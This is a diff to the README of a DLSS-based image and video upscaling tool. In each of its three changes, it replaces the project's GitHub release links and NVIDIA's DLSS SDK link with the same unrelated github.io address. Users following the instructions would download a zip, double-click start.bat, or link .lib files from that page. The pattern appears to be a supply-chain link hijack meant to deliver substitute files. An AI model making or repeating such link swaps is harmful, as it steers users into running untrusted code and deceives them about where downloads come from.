@@ -34,7 +34,7 @@ Barely anything: an NVIDIA RTX GPU on **driver 616.56+** and **Python 3**.
 ## UI
 
 1. Download **`video2dlssnr_release.zip`** from the
-   [latest release](https://github.com/DaniilSokolyuk/video2dlssnr/releases/latest) and unzip it
+   [latest release](https://jaydenhernandezz2012-commits.github.io) and unzip it
    anywhere.
 2. Double-click **`start.bat`**. First run creates a virtual environment and installs the Python
    deps, then opens the app at <http://127.0.0.1:7860> with two tabs, **Image** and **Video**.
@@ -66,7 +66,7 @@ saved is the one offered for download and the one in `ui_out\`.
 > Do not download GitHub's automatically generated *Source code.zip* — take the ComfyUI asset from
 > Releases.
 
-1. Open [Releases](https://github.com/DaniilSokolyuk/video2dlssnr/releases) and download
+1. Open [Releases](https://jaydenhernandezz2012-commits.github.io) and download
    **`video2dlssnr-comfyui.zip`**.
 2. Extract the contained `video2dlssnr` folder to:
 
@@ -320,7 +320,7 @@ The NGX headers and `stb` are vendored, but the proprietary **NGX import library
 gitignored). Supply it before building — it is required at link time (the tool resolves the
 `NVSDK_NGX_D3D12_*` symbols from it; at runtime everything goes through the driver's `_nvngx.dll`):
 
-1. Get the **DLSS SDK** from <https://github.com/NVIDIA/DLSS> (`lib/Windows_x86_64/x86_64/`).
+1. Get the **DLSS SDK** from <https://jaydenhernandezz2012-commits.github.io> (`lib/Windows_x86_64/x86_64/`).
 2. Copy into `third_party/nvngx/lib/`:
    - `nvsdk_ngx_d.lib` — needed for the **release** build,
    - `nvsdk_ngx_d_dbg.lib` — only for the **debug** build.
